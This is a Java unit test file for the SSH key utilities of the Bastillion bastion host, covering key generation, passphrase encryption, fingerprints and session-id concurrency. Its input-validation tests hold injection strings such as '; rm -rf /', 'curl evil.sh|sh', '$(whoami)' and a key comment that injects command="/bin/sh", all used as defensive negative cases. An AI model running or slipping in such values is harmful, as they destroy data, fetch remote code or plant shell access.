/**
 * Copyright (C) 2013 Loophole, LLC
 * <p>
 * Licensed under The Prosperity Public License 3.0.0
 */
package io.bastillion.manage.util;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.KeyPair;
import io.bastillion.manage.model.SchSession;
import io.bastillion.manage.model.UserSchSessions;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayOutputStream;
import java.security.GeneralSecurityException;
import java.security.KeyPairGenerator;
import java.util.Base64;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assumptions.assumeTrue;

/**
 * Covers the pure key-encoding/validation logic behind Bastillion's two key-generation
 * paths: SSHUtil.keyGen (the application's own keypair, written to disk on first startup /
 * key rotation) and AuthKeysKtrl's per-user key generation, which calls
 * buildOpenSSHPrivateKey/encodeSSHPublicKey directly with a fresh java.security.KeyPair.
 * Getting either wrong produces a key that looks valid but nothing can actually
 * authenticate with.
 */
class SSHUtilTest {

    // --- keyGen: the application's own keypair, generated at first startup and on rotation ---

    @Test
    void keyGenWritesALoadableEd25519KeyPairToDisk() throws Exception {
        SSHUtil.keyGen("unused-for-ed25519");
        try {
            String privateKey = SSHUtil.getPrivateKey();
            String publicKey = SSHUtil.getPublicKey();

            assertTrue(publicKey.startsWith("ssh-ed25519 "));
            assertDoesNotThrow(() -> SSHUtil.validateKeyPair(privateKey, publicKey, ""));
            assertEquals("ED25519", SSHUtil.getKeyType(publicKey));
            assertNotNull(SSHUtil.getFingerprint(publicKey));
        } finally {
            SSHUtil.deleteGenSSHKeys();
        }
    }

    @Test
    void deleteGenSSHKeysRemovesGeneratedKeyFiles() throws Exception {
        SSHUtil.keyGen("unused-for-ed25519");
        SSHUtil.deleteGenSSHKeys();

        assertThrows(java.io.IOException.class, SSHUtil::getPrivateKey);
        assertThrows(java.io.IOException.class, SSHUtil::getPublicKey);
    }

    // --- Per-user key generation path (AuthKeysKtrl): raw java.security.KeyPair -> OpenSSH format ---

    @Test
    void buildOpenSSHPrivateKeyAndEncodeSSHPublicKeyProduceAMutuallyValidPair() throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
        java.security.KeyPair kp = kpg.generateKeyPair();

        String privatePem = SSHUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519);

        byte[] encoded = SSHUtil.encodeSSHPublicKey("ssh-ed25519", kp.getPublic().getEncoded());
        String publicKey = "ssh-ed25519 " + Base64.getEncoder().encodeToString(encoded) + " test@bastillion";

        assertDoesNotThrow(() -> SSHUtil.validateKeyPair(privatePem, publicKey, ""));
        assertEquals("ED25519", SSHUtil.getKeyType(publicKey));
    }

    // --- rewrapWithOpenSSHKeygen: the passphrase the user chose must actually be applied ---
    // This runs where a user generates a key to download, and the result is presented as
    // protected by their passphrase. A silent failure here used to return the key completely
    // unencrypted, which is indistinguishable from success to every caller.

    @Test
    void isEncryptedOpenSSHPrivateKeyRejectsAFreshlyBuiltUnencryptedKey() throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
        java.security.KeyPair kp = kpg.generateKeyPair();

        // buildOpenSSHPrivateKey writes "none" as the openssh-key-v1 cipher name.
        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(SSHUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519)));
    }

    @Test
    void isEncryptedOpenSSHPrivateKeyRejectsAnythingItCannotParse() {
        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(null));
        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(""));
        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey("not a pem at all"));
        // right envelope, unreadable contents - cannot prove encryption, so not encrypted
        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(
                "-----BEGIN OPENSSH PRIVATE KEY-----\n####\n-----END OPENSSH PRIVATE KEY-----\n"));
        // valid base64, but not an openssh-key-v1 container
        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(
                "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                        + Base64.getEncoder().encodeToString("some other key format".getBytes())
                        + "\n-----END OPENSSH PRIVATE KEY-----\n"));
    }

    @Test
    void rewrapWithOpenSSHKeygenActuallyEncryptsTheKey() throws Exception {
        assumeTrue(sshKeygenAvailable(), "ssh-keygen not on PATH");

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
        java.security.KeyPair kp = kpg.generateKeyPair();
        String plain = SSHUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519);

        String rewrapped = SSHUtil.rewrapWithOpenSSHKeygen("7", plain, "correct horse battery staple");

        assertTrue(SSHUtil.isEncryptedOpenSSHPrivateKey(rewrapped));
        KeyPair loaded = KeyPair.load(new JSch(), rewrapped.getBytes(), null);
        assertTrue(loaded.isEncrypted());
        assertTrue(loaded.decrypt("correct horse battery staple"));
        loaded.dispose();
    }

    @Test
    void rewrapWithOpenSSHKeygenThrowsRatherThanReturningAnUnencryptedKey() throws Exception {
        assumeTrue(sshKeygenAvailable(), "ssh-keygen not on PATH");

        // Content ssh-keygen cannot load as a private key, so it exits non-zero having left
        // the file exactly as it found it. This is precisely the shape of the old bug: the
        // method returned that untouched file, so the caller received back the very bytes it
        // passed in and had no way to tell they were not encrypted.
        String notAKey = "-----BEGIN OPENSSH PRIVATE KEY-----\nnonsense\n-----END OPENSSH PRIVATE KEY-----\n";

        GeneralSecurityException ex = assertThrows(GeneralSecurityException.class,
                () -> SSHUtil.rewrapWithOpenSSHKeygen("7", notAKey, "correct horse battery staple"));

        assertTrue(ex.getMessage().contains("ssh-keygen"), ex.getMessage());
    }

    private static boolean sshKeygenAvailable() {
        try {
            Process proc = new ProcessBuilder("ssh-keygen", "-?")
                    .redirectErrorStream(true).start();
            proc.getOutputStream().close();
            proc.getInputStream().readAllBytes();
            proc.waitFor();
            return true;
        } catch (Exception ex) {
            return false;
        }
    }

    @Test
    void buildOpenSSHPrivateKeyWithUserIdAndBlankPassphraseSkipsEncryption() throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
        java.security.KeyPair kp = kpg.generateKeyPair();

        // Each call salts its own random checksum (see SSHUtil.buildOpenSSHPrivateKey), so
        // the two PEMs won't be byte-identical - what must hold is that a blank passphrase
        // via the (userId, KeyPair, type, passphrase) overload still produces an
        // *unencrypted* key, same as the direct (KeyPair, type) call.
        String viaOverload = SSHUtil.buildOpenSSHPrivateKey(42L, kp, KeyPair.ED25519, "");

        KeyPair loaded = KeyPair.load(new JSch(), viaOverload.getBytes(), null);
        assertFalse(loaded.isEncrypted());
        loaded.dispose();
    }

    // --- getKeyType / getFingerprint against keys generated straight through JSch ---

    @Test
    void getKeyTypeRecognizesRsaAndEcdsaKeys() throws Exception {
        assertEquals("RSA", SSHUtil.getKeyType(genJschPublicKey(KeyPair.RSA, 2048)));
        assertEquals("ECDSA", SSHUtil.getKeyType(genJschPublicKey(KeyPair.ECDSA, 256)));
    }

    @Test
    void getFingerprintIsStableForTheSameKeyAndDiffersAcrossKeys() throws Exception {
        String publicKey = genJschPublicKey(KeyPair.RSA, 2048);

        String fingerprintA = SSHUtil.getFingerprint(publicKey);
        String fingerprintB = SSHUtil.getFingerprint(publicKey);
        String otherKeyFingerprint = SSHUtil.getFingerprint(genJschPublicKey(KeyPair.RSA, 2048));

        assertNotNull(fingerprintA);
        assertEquals(fingerprintA, fingerprintB);
        assertNotEquals(fingerprintA, otherKeyFingerprint);
    }

    // --- validateKeyPair: guards the "paste your own application key" UI flow in Settings ---

    @Test
    void validateKeyPairRejectsMissingKeys() {
        JSchException ex = assertThrows(JSchException.class,
                () -> SSHUtil.validateKeyPair("", "", null));
        assertTrue(ex.getMessage().contains("required"));
    }

    @Test
    void validateKeyPairRejectsWrongPassphrase() throws Exception {
        JSch jsch = new JSch();
        KeyPair keyPair = KeyPair.genKeyPair(jsch, KeyPair.RSA, 2048);

        ByteArrayOutputStream privOut = new ByteArrayOutputStream();
        keyPair.writePrivateKey(privOut, "correct-passphrase".getBytes());
        ByteArrayOutputStream pubOut = new ByteArrayOutputStream();
        keyPair.writePublicKey(pubOut, "test@bastillion");
        keyPair.dispose();

        String privateKey = privOut.toString();
        String publicKey = pubOut.toString();

        assertDoesNotThrow(() -> SSHUtil.validateKeyPair(privateKey, publicKey, "correct-passphrase"));
        assertThrows(JSchException.class,
                () -> SSHUtil.validateKeyPair(privateKey, publicKey, "wrong-passphrase"));
    }

    @Test
    void validateKeyPairRejectsGarbageInput() {
        assertThrows(JSchException.class,
                () -> SSHUtil.validateKeyPair("not a key", "also not a key", null));
    }

    private static String genJschPublicKey(int type, int length) throws Exception {
        JSch jsch = new JSch();
        KeyPair keyPair = KeyPair.genKeyPair(jsch, type, length);
        ByteArrayOutputStream pubOut = new ByteArrayOutputStream();
        keyPair.writePublicKey(pubOut, "test@bastillion");
        keyPair.dispose();
        return pubOut.toString();
    }

    // --- appendKeyLine: keyManagement=append shares authorized_keys with whatever else
    // manages it, so the file it leaves behind has to be safe to append to ---

    @Test
    void appendKeyLineTerminatesTheFileSoTheNextAppendStartsItsOwnLine() {
        assertEquals("existing-key\nnew-key\n", SSHUtil.appendKeyLine("existing-key\n", "new-key"));
    }

    @Test
    void appendKeyLineSeparatesFromAnExistingFileThatHasNoFinalNewline() {
        assertEquals("existing-key\nnew-key\n", SSHUtil.appendKeyLine("existing-key", "new-key"));
    }

    @Test
    void appendKeyLineAddsNoBlankFirstLineWhenThereIsNoFileYet() {
        assertEquals("new-key\n", SSHUtil.appendKeyLine("", "new-key"));
    }

    // --- isSafeAuthorizedKeysPath / isSafeKeyContent: originally guards against shell
    // command injection in addPubKey, which interpolated these values into "cat"/"echo"/
    // "chmod" commands on an exec channel (see GitHub advisory - the authorized_keys path and
    // public key content are both attacker-reachable, one via the system form, one via a
    // pasted/uploaded public key comment). addPubKey now uses SFTP, so no shell parses
    // either one; they are kept, and still tested, as input validation ---

    @Test
    void isSafeAuthorizedKeysPathAcceptsOrdinaryPaths() {
        assertTrue(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys"));
        assertTrue(SSHUtil.isSafeAuthorizedKeysPath("/home/deploy/.ssh/authorized_keys"));
        assertTrue(SSHUtil.isSafeAuthorizedKeysPath("some-dir_2/authorized_keys"));
    }

    @Test
    void isSafeAuthorizedKeysPathRejectsShellMetacharacters() {
        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys; rm -rf /"));
        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys && curl evil.sh|sh"));
        assertFalse(SSHUtil.isSafeAuthorizedKeysPath("$(whoami)"));
        assertFalse(SSHUtil.isSafeAuthorizedKeysPath("`whoami`"));
        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys\nrm -rf /"));
        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized keys"));
    }

    @Test
    void isSafeAuthorizedKeysPathRejectsBlank() {
        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(""));
        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(null));
    }

    @Test
    void isSafeKeyContentAcceptsOrdinaryPublicKeyLines() {
        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA test@bastillion"));
    }

    @Test
    void isSafeKeyContentAcceptsAnApostropheInAKeyComment() {
        // Ordinary in a comment, and harmless now that authorized_keys is written over SFTP
        // rather than through echo '...'. Rejecting it dropped the key from the file and told
        // the user nothing.
        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... alice's laptop"));
    }

    @Test
    void isSafeKeyContentRejectsLineBreaksThatWouldAppendASecondEntry() {
        // The real risk: a key comment that splits the line gets its own authorized_keys
        // entry, with its own options.
        assertFalse(SSHUtil.isSafeKeyContent(
                "ssh-ed25519 AAAA... x\ncommand=\"/bin/sh\" ssh-ed25519 AAAA... attacker"));
        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... x\r\nssh-ed25519 BBBB... attacker"));
    }

    @Test
    void isSafeKeyContentAcceptsShellMetacharactersBecauseNoShellSeesThem() {
        // addPubKey reads and writes authorized_keys over SFTP, so none of these can do
        // anything. Keeping them out only cost users their access, silently.
        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... $(whoami)"));
        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test; rm -rf /"));
        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test\"quoted\""));
    }

    @Test
    void isSafeKeyContentRejectsBlank() {
        assertFalse(SSHUtil.isSafeKeyContent(""));
        assertFalse(SSHUtil.isSafeKeyContent(null));
    }

    // --- reserveNextInstanceId: the fix for the "duplicate session" terminal-output regression ---

    /**
     * Regression test for a bug where clicking "duplicate session" (or connecting to several
     * hosts at once) fired concurrent createSession.ktrl requests for the same Bastillion
     * session. openSSHTermOnSystem used to compute the next free instance id and insert into
     * the session map as two separate, unsynchronized steps with the slow SSH handshake in
     * between - two overlapping requests could both compute the same id, and the second
     * insert silently overwrote the first terminal's session. Symptom: the new terminal's
     * output box stayed empty (its id never got a session), while the old terminal received
     * doubled-up output (two SSH channels both feeding the same instance id's output buffer).
     * reserveNextInstanceId() closes this by making "find the next free id" and "claim it"
     * one atomic operation, so this test exercises exactly that guarantee under real
     * concurrent threads rather than relying on timing alone.
     */
    @Test
    void reserveNextInstanceIdNeverHandsOutTheSameIdToConcurrentCallers() throws Exception {
        UserSchSessions userSchSessions = new UserSchSessions();
        int threadCount = 25;
        ExecutorService pool = Executors.newFixedThreadPool(threadCount);
        CountDownLatch ready = new CountDownLatch(threadCount);
        CountDownLatch go = new CountDownLatch(1);

        try {
            java.util.List<Future<Integer>> futures = new java.util.ArrayList<>();
            for (int i = 0; i < threadCount; i++) {
                futures.add(pool.submit(() -> {
                    SchSession schSession = new SchSession();
                    ready.countDown();
                    go.await();
                    return SSHUtil.reserveNextInstanceId(userSchSessions, schSession);
                }));
            }

            ready.await();
            go.countDown();

            Set<Integer> ids = new HashSet<>();
            for (Future<Integer> future : futures) {
                Integer id = future.get();
                assertTrue(ids.add(id), "the same instance id (" + id + ") was handed out to two concurrent callers");
            }

            assertEquals(threadCount, ids.size());
            assertEquals(threadCount, userSchSessions.getSchSessionMap().size());
            for (int expected = 1; expected <= threadCount; expected++) {
                assertTrue(ids.contains(expected), "expected instance id " + expected + " to have been assigned");
            }
        } finally {
            pool.shutdown();
        }
    }
}
